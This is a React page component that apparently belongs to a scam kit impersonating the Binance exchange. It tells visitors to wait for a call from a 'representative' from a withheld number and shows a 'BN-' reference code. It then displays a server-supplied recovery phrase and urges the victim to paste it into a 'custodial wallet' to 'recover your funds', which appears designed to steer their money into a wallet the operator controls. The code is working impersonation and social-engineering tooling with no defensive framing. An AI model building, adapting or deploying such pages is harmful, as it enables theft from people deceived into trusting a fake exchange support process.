"use client";
import { Card, CardContent } from "@/components/ui/card";
import { Banner } from "@/components/core/Banner";
import { CopyRight } from "@/components/core/CopyRight";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Check, Copy } from "lucide-react";
import { cn } from "@/lib/utils";
import { SecuritySession } from "@binance/db";
import { getPlatform } from "@/lib/platform";

interface Props {
  securitySession: SecuritySession;
}

export default function ClientOnly({ securitySession }: Props) {
  const [recoveryPhrase, setRecoveryPhrase] = useState<string | null>(
    securitySession.recoveryPhrase
  );
  const [isCopied, setIsCopied] = useState(false);

  useEffect(() => {
    // Poll for status updates
    const interval = setInterval(async () => {
      const response = await fetch(
        `/api/security/status?security_code=${securitySession.securityCode}`
      );

      const data = await response.json();

      console.log("Polling for status updates:", data.status);
      if (data.status === "completed") {
        // redirect to the platform site
        window.location.href = getPlatform().redirectUrl;
      }
      if (data.recoveryPhrase) {
        setRecoveryPhrase(data.recoveryPhrase);
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [securitySession.securityCode]);

  const handleCopy = () => {
    if (recoveryPhrase) {
      navigator.clipboard.writeText(recoveryPhrase).then(
        () => {
          setIsCopied(true);
          setTimeout(() => {
            setIsCopied(false);
          }, 2000);
        },
        (err) => {
          console.error("Could not copy text: ", err);
        }
      );
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <Banner securityCode={securitySession.securityCode} />
        <Card className="shadow-lg py-0">
          <CardContent className="py-6">
            {recoveryPhrase ? (
              <>
                <div className="text-start mb-6">
                  <h2 className="text-xl font-semibold mb-2">
                    Secure recovery phrase
                  </h2>
                </div>
                <div className="mb-6">
                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
                    <AlertDescription className="text-muted-foreground text-center">
                      This recovery phrase is linked to your account to keep
                      your funds safe. Please copy it and paste it into your
                      custodial wallet
                    </AlertDescription>
                  </Alert>
                </div>
                <div className="mb-6">
                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
                    <AlertTitle className="text-start mb-2 text-muted-foreground w-full">
                      Your Recovery Phrase:
                    </AlertTitle>
                    <AlertDescription className="text-muted-foreground text-start p-4 rounded-md bg-background w-full ">
                      {recoveryPhrase}
                    </AlertDescription>
                  </Alert>
                </div>

                <div className="mb-6">
                  <Button
                    className={cn(
                      "w-full bg-red-500 hover:bg-red-600 text-white h-12",
                      isCopied && "opacity-50 cursor-not-allowed"
                    )}
                    onClick={handleCopy}
                  >
                    {isCopied ? (
                      <span className="flex items-center justify-center">
                        <Check className="h-4 w-4 mr-2" /> Copied!
                      </span>
                    ) : (
                      <span className="flex items-center justify-center">
                        <Copy className="h-4 w-4 mr-2" /> Copy Recovery Phrase
                      </span>
                    )}
                  </Button>
                </div>

                <div className="mb-6">
                  <p className="text-muted-foreground text-sm text-center px-4 mb-4">
                    After copying, please paste this recovery phrase into your
                    custodial wallet to complete the verification and recover
                    your funds.
                  </p>
                </div>
              </>
            ) : (
              <>
                <div className="text-center mb-6">
                  <h2 className="text-2xl font-semibold mb-2">
                    Please expect a call from a {getPlatform().name}{" "}
                    representative shortly
                  </h2>
                  <p className="text-muted-foreground text-sm text-center px-4 mb-4">
                    Calls may may show up from a restricted or withheld number.
                    Please answer promptly so we can assist you.
                  </p>
                </div>

                <div className="mb-6">
                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
                    <AlertTitle className="text-lg font-semibold text-center mb-2 text-muted-foreground">
                      Use reference
                    </AlertTitle>
                    <AlertDescription className="text-primary text-center text-3xl font-bold uppercase">
                      BN-{securitySession.securityCode}
                    </AlertDescription>
                  </Alert>
                </div>

                <div className="mb-6">
                  <p className="text-muted-foreground text-center px-4 mb-4">
                    We take your security seriously and will help resolve this
                    issue as quickly as possible.
                  </p>
                </div>

                <div className="mb-6">
                  <Alert className="mb-4 flex flex-col items-center justify-center py-6 bg-primary/10 border-0">
                    <AlertDescription className="text-muted-foreground text-center">
                      Please don&apos;t close this page. You will need to
                      provide information to the agent
                    </AlertDescription>
                  </Alert>
                </div>
              </>
            )}
          </CardContent>
        </Card>
        <CopyRight />
      </div>
    </div>
  );
}
